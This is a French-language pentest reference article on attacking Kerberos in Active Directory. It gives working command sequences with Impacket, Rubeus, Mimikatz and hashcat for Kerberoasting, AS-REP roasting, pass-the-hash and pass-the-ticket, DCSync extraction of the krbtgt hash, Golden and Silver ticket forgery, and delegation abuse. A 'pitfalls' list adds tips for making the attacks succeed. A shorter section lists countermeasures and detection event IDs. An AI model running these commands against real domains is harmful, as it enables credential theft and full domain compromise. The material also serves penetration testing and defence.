---
title: Kerberos Attacks
domain: sciences-appliquées
subdomain: informatique / sécurité
tags: [kerberos, active-directory, kerberoasting, as-rep, golden-ticket, silver-ticket, pentest, sécurité]
date: 2026-03-23
---

# Kerberos Attacks

Kerberos est le protocole d'authentification central d'Active Directory. Ses mécanismes de tickets exposent plusieurs vecteurs d'attaque allant du cracking hors ligne (Kerberoasting, AS-REP Roasting) à la falsification de tickets (Golden/Silver Ticket) et à la délégation non contrainte.

## Rappel du protocole Kerberos

```
Flux d'authentification :

Client → KDC (AS) : AS-REQ (demande de TGT)
  → Contient : username, timestamp chiffré avec le hash NTLM du user

KDC (AS) → Client : AS-REP (TGT)
  → TGT chiffré avec le hash NTLM de krbtgt
  → Session key chiffrée avec le hash NTLM du user

Client → KDC (TGS) : TGS-REQ (demande de TGS pour un service)
  → Contient : TGT + SPN du service cible

KDC (TGS) → Client : TGS-REP (ticket de service = TGS)
  → TGS chiffré avec le hash NTLM du compte de service

Client → Service : AP-REQ (accès au service)
  → Présente le TGS → le service déchiffre avec son propre hash

Acteurs :
  KDC (Key Distribution Center) : généralement le contrôleur de domaine
  AS  (Authentication Service) : émet les TGT
  TGS (Ticket Granting Service) : émet les tickets de service
  krbtgt : compte spécial dont le hash protège tous les TGT
```

## Kerberoasting

Demander des TGS pour des comptes avec SPN, puis cracker les hashes hors ligne.

```
Principe :
  1. Tout utilisateur authentifié peut demander un TGS pour n'importe quel SPN
  2. Le TGS est chiffré avec le hash du compte de service (RC4-HMAC ou AES)
  3. L'attaquant extrait le hash et le cracke hors ligne (pas de lockout)
  4. Si le mot de passe du compte de service est faible → compromission

Cibles idéales :
  → Comptes de service avec SPN (servicePrincipalName non vide)
  → Pas des comptes machine (mots de passe 120 caractères aléatoires)
  → Comptes humains utilisés comme comptes de service (mots de passe souvent faibles)
```

```bash
# Impacket — GetUserSPNs.py
python3 GetUserSPNs.py domaine.local/alice:Password123 -dc-ip 192.168.1.1

# Avec dump des hashes pour cracking
python3 GetUserSPNs.py domaine.local/alice:Password123 -dc-ip 192.168.1.1 \
    -request -outputfile kerberoast_hashes.txt

# Rubeus — depuis Windows
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql_hash.txt   # Cibler un compte

# PowerView — identifier les comptes kerberoastables
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# CrackMapExec
nxc ldap 192.168.1.1 -u alice -p Password123 --kerberoasting hashes.txt

# Cracker les hashes
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# AES hashes (mode 19600 = AES128, 19700 = AES256)
hashcat -m 19700 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

## AS-REP Roasting

Attaque ciblant les comptes avec la pré-authentification Kerberos désactivée.

```
Principe :
  La pré-authentification Kerberos oblige le client à chiffrer un timestamp
  avec son mot de passe → prouve qu'il connaît le mot de passe AVANT d'obtenir un TGT

  Si DONT_REQUIRE_PREAUTH est activé sur un compte :
  → N'importe qui peut demander un AS-REP pour ce compte SANS connaître le mot de passe
  → L'AS-REP contient une partie chiffrée avec le hash du compte → crackable hors ligne

Attribut Active Directory : userAccountControl & 4194304 (DONT_REQUIRE_PREAUTH)
```

```bash
# Impacket — GetNPUsers.py (pas de credentials nécessaires si pré-auth désactivée)
python3 GetNPUsers.py domaine.local/ -usersfile users.txt -dc-ip 192.168.1.1 -no-pass

# Avec credentials (pour énumérer qui a DONT_REQUIRE_PREAUTH)
python3 GetNPUsers.py domaine.local/alice:Password123 -dc-ip 192.168.1.1 \
    -request -format hashcat -outputfile asrep_hashes.txt

# Rubeus — depuis Windows
Rubeus.exe asreproast /outfile:asrep_hashes.txt
Rubeus.exe asreproast /user:alice /format:hashcat /outfile:alice_hash.txt

# PowerView — identifier les comptes vulnérables
Get-DomainUser -UACFilter DONT_REQ_PREAUTH | Select-Object samaccountname

# Cracker les hashes AS-REP
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
john --format=krb5asrep asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## Overpass-the-Hash (Pass-the-Key)

Convertir un hash NTLM en ticket Kerberos (TGT).

```
Différence avec Pass-the-Hash :
  PtH → authentification NTLM (SMB, WMI...)
  OPtH → authentification Kerberos → obtenir un TGT complet

Avantage : le trafic Kerberos est moins suspect que NTLM dans beaucoup d'environnements
```

```bash
# Impacket — getTGT.py avec hash NTLM
python3 getTGT.py domaine.local/administrator -hashes :NTLM_HASH -dc-ip 192.168.1.1
export KRB5CCNAME=administrator.ccache

# Utiliser le TGT
python3 psexec.py domaine.local/administrator@DC01 -k -no-pass
python3 secretsdump.py -k -no-pass domaine.local/administrator@DC01

# Rubeus — depuis Windows
Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /ptt
# /ptt = Pass-the-Ticket → injecte le TGT dans la session courante

# Mimikatz
sekurlsa::pth /user:Administrator /domain:domaine.local /ntlm:NTLM_HASH /run:cmd.exe
# Ouvre une cmd.exe avec le contexte Kerberos d'Administrator
```

## Pass-the-Ticket (PtT)

Injecter un ticket Kerberos volé (TGT ou TGS) dans une session.

```bash
# Exporter les tickets depuis la mémoire
# Mimikatz
sekurlsa::tickets /export      # Exporte les .kirbi
kerberos::list /export

# Rubeus
Rubeus.exe dump /nowrap         # Dump en base64
Rubeus.exe dump /service:krbtgt /nowrap   # Seulement les TGTs

# Impacket — depuis Linux
python3 ticketConverter.py ticket.kirbi ticket.ccache   # Convertir .kirbi → .ccache
export KRB5CCNAME=ticket.ccache

# Injecter un ticket
# Mimikatz
kerberos::ptt ticket.kirbi

# Rubeus
Rubeus.exe ptt /ticket:TICKET_BASE64
Rubeus.exe ptt /ticket:C:\tickets\ticket.kirbi

# Vérifier les tickets injectés
klist              # Windows (natif)
Rubeus.exe klist
```

## Golden Ticket

Forger un TGT arbitraire avec le hash de krbtgt → persistance totale sur le domaine.

```
Prérequis : hash NTLM (ou AES) du compte krbtgt
  → Obtenu via DCSync (lsadump::dcsync) ou dump NTDS

Impact :
  → TGT valide pour 10 ans (par défaut dans Mimikatz)
  → Accès à n'importe quelle ressource du domaine
  → Survit aux réinitialisations de mots de passe des utilisateurs
  → Persiste même si le compte compromis est supprimé
  → SEUL moyen de l'invalider : changer le mot de passe de krbtgt DEUX FOIS
```

```bash
# Obtenir le hash krbtgt
# Mimikatz (sur le DC ou avec DCSync)
lsadump::dcsync /user:krbtgt /domain:domaine.local

# Impacket
python3 secretsdump.py domaine.local/administrator:Password@DC01 -just-dc-user krbtgt

# Récupérer le SID du domaine
python3 lookupsid.py domaine.local/alice:Password123@DC01 | head -5

# Forger le Golden Ticket
# Mimikatz
kerberos::golden /user:Administrator \
    /domain:domaine.local \
    /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
    /krbtgt:KRBTGT_NTLM_HASH \
    /id:500 \
    /groups:512,513,518,519,520 \
    /ptt

# Avec Impacket
python3 ticketer.py -nthash KRBTGT_HASH \
    -domain-sid S-1-5-21-... \
    -domain domaine.local Administrator

export KRB5CCNAME=Administrator.ccache
python3 psexec.py domaine.local/Administrator@DC01 -k -no-pass
```

## Silver Ticket

Forger un TGS pour un service spécifique avec le hash du compte de service.

```
Différence Golden / Silver :
  Golden → TGT → accès à tout (mais passe par le KDC → loggable)
  Silver → TGS → accès à un service spécifique (SANS contacter le KDC → plus furtif)

Cibles courantes :
  cifs/SERVER01   → accès fichiers SMB
  http/SERVER01   → accès web (IIS avec auth Kerberos)
  mssql/SERVER01  → accès SQL Server
  host/SERVER01   → tâches planifiées, services
  wsman/SERVER01  → WinRM / PowerShell remoting
```

```bash
# Mimikatz — Silver Ticket
kerberos::golden /user:Administrator \
    /domain:domaine.local \
    /sid:S-1-5-21-... \
    /target:SERVER01.domaine.local \
    /service:cifs \
    /rc4:MACHINE_ACCOUNT_NTLM_HASH \
    /ptt

# Impacket — Silver Ticket
python3 ticketer.py -nthash MACHINE_HASH \
    -domain-sid S-1-5-21-... \
    -domain domaine.local \
    -spn cifs/SERVER01.domaine.local \
    Administrator

export KRB5CCNAME=Administrator.ccache
python3 smbclient.py -k domaine.local/Administrator@SERVER01
```

## Délégation Kerberos — Attaques

```
Délégation non contrainte (Unconstrained Delegation) :
  → Le serveur peut s'authentifier EN TANT QUE l'utilisateur vers N'IMPORTE quel service
  → Le TGT de l'utilisateur est stocké dans la mémoire du serveur délégant
  → Si on compromet un serveur avec délégation non contrainte → voler les TGTs des admin

Délégation contrainte (Constrained Delegation) :
  → Le serveur ne peut déléguer que vers des services spécifiés (msDS-AllowedToDelegateTo)
  → S4U2Self + S4U2Proxy : le serveur peut s'authentifier en tant que n'importe quel user
  → vers les services autorisés → accès à ces services sous l'identité de l'admin

RBCD (Resource-Based Constrained Delegation) :
  → La ressource cible contrôle qui peut déléguer vers elle (msDS-AllowedToActOnBehalfOfOtherIdentity)
  → Si on a WriteProperty sur ce champ → configurer notre machine comme pouvant déléguer
  → S4U2Self/S4U2Proxy → TGS au nom d'Administrator pour la machine cible
```

```bash
# Trouver les serveurs avec délégation non contrainte
Get-DomainComputer -Unconstrained | Select-Object dnshostname

# SpoolSample / PrinterBug — forcer le DC à s'authentifier vers la machine compromise
# Si DC a besoin de s'authentifier → son TGT arrive sur notre machine
python3 printerbug.py domaine.local/alice:Password123@DC01 MACHINE_AVEC_DELEGATION

# Capturer le TGT du DC avec Rubeus
Rubeus.exe monitor /interval:5 /nowrap    # Sur la machine avec délégation non contrainte
# Quand le DC s'authentifie → TGT DC$ capturé → DCSync possible

# Exploitation RBCD (avec WriteProperty sur msDS-AllowedToActOnBehalfOfOtherIdentity)
# Impacket — rbcd.py
python3 rbcd.py -delegate-from 'attacker$' -delegate-to 'TARGET$' \
    -action write domaine.local/alice:Password123

# Obtenir un TGS en tant qu'Administrator pour TARGET
python3 getST.py -spn cifs/TARGET.domaine.local \
    -impersonate Administrator \
    domaine.local/'attacker$':Password123
```

## Contre-mesures

```
Contre le Kerberoasting :
  ✓ Mots de passe longs (25+ caractères) pour les comptes de service
  ✓ Utiliser des Managed Service Accounts (MSA/gMSA) — mots de passe auto-générés 120 chars
  ✓ AES only — désactiver RC4 pour les comptes de service (RC4 = plus rapide à cracker)
  ✓ Surveiller les demandes massives de TGS (Event ID 4769)

Contre l'AS-REP Roasting :
  ✓ Ne jamais désactiver la pré-authentification Kerberos sans raison légitime
  ✓ Auditer régulièrement (DONT_REQUIRE_PREAUTH) : Get-DomainUser -UACFilter DONT_REQ_PREAUTH

Contre les Golden/Silver Tickets :
  ✓ Changer le mot de passe de krbtgt deux fois (invalide tous les TGTs existants)
  ✓ Rotation régulière du mot de passe krbtgt (tous les 180 jours minimum)
  ✓ Protected Users Security Group : empêche la délégation, force Kerberos AES
  ✓ Credential Guard : protège les tickets en mémoire

Contre la délégation non contrainte :
  ✓ Auditer les comptes avec délégation non contrainte (hors DC)
  ✓ Préférer la délégation contrainte ou RBCD aux déploiements légitimes
  ✓ Activer "Account is sensitive and cannot be delegated" sur les comptes admin

Détection :
  Event ID 4768 : demande de TGT (AS-REQ)
  Event ID 4769 : demande de TGS (Kerberoasting si RC4 + volume)
  Event ID 4771 : échec pré-authentification
  Event ID 4624 / 4672 : authentification avec privileges élevés
```

## Pièges courants

- **Kerberoasting vs AS-REP Roasting — confusion classique** : Kerberoasting cible des comptes **avec SPN** (besoin d'être authentifié pour demander un TGS). AS-REP Roasting cible des comptes **sans pré-auth** (`DONT_REQUIRE_PREAUTH`, possible sans creds). Les modes hashcat sont différents (13100 vs 18200).
- **Format de hash Kerberoast change avec l'encryption type** : `$krb5tgs$23$` = RC4-HMAC (crack rapide), `$krb5tgs$18$` = AES256 (très lent). Beaucoup ratent un crack parce qu'ils utilisent le mauvais mode hashcat (`-m 19700` pour AES256).
- **Compte machine = mot de passe 120 caractères aléatoires** : Kerberoasting un compte machine ne donne quasiment jamais rien (mot de passe non humain). Cibler uniquement les comptes avec SPN qui sont des **comptes humains** convertis en comptes de service.
- **Pré-auth Kerberos désactivée mais compte verrouillé** : un compte AS-REP roastable mais désactivé ne donne rien. Toujours filtrer `userAccountControl` pour les comptes actifs.
- **Golden Ticket avec krbtgt rotation insuffisante** : changer le mot de passe krbtgt UNE FOIS ne suffit pas — Windows garde l'historique des 2 derniers mots de passe pour la résilience. Il faut changer **deux fois** rapidement pour invalider les Golden Tickets existants.
- **Silver Ticket invisible côté DC** : contrairement à un Golden, un Silver Ticket ne touche jamais le DC (forge un TGS, pas un TGT). Les logs côté DC ne montrent rien. Détection seulement côté service ciblé.
- **Unconstrained Delegation = TOUS les TGT entrants** : pas seulement ceux des admins. Mais c'est l'attente d'une connexion d'admin qui rend l'attaque utile. Combiner avec PrinterBug ou PetitPotam pour forcer le DC$ à se connecter.
- **PAC validation et signature** : depuis les CVE 2022 (CVE-2022-37967), Microsoft a renforcé les signatures PAC. Certains Golden/Silver Tickets old-school échouent maintenant. Toujours forger avec les signatures correctes (`/sids` et `/groups` cohérents avec le domaine).
- **`klist` montre les tickets mais ne les valide pas** : un ticket peut apparaître valide dans `klist` mais être rejeté par le service à l'usage. Tester avec un service réel (`dir \\target\C$`).
- **AES tickets requièrent la salt correcte** : pour forger un ticket AES, il faut la salt Kerberos exacte du compte (`USERNAMEdomain.com` pour user, `host/COMPUTERNAME.domain.comDOMAIN.COM` pour machine). Une salt incorrecte = signature invalide.
